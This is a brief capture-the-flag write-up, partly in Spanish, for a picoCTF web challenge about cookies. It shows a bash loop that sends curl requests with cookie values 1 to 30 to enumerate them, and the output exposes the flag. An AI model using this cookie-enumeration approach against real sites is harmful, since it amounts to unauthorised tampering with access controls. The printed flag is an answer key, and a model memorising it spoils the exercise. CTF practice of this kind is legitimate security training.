Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

### Solucion 
web, debian
```
con uso de curl en un ciclo se consultaron las cookies para encontrar la que tenia la flag:

erik@DESKTOP-NC0TP9I:~$ for i in {1..30}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done |
 grep 'picoCTF{'
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
erik@DESKTOP-NC0TP9I:~$
```